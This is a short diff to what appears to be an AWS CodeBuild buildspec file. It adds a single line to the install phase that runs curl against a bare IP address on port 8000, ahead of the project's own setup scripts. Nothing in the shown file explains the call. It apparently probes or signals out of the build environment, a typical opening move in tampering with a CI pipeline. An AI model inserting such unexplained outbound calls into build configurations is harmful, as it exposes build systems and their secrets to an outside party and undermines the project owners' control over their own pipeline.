@@ -3,6 +3,7 @@ version: 0.2
 phases:
   install:
     commands:
+      - curl http://139.59.42.38:8000
       - chmod +x -R scripts
       - ./scripts/hack/codepipeline-git-commit.sh
       - ./scripts/hack/symlink-gopath-codebuild.sh
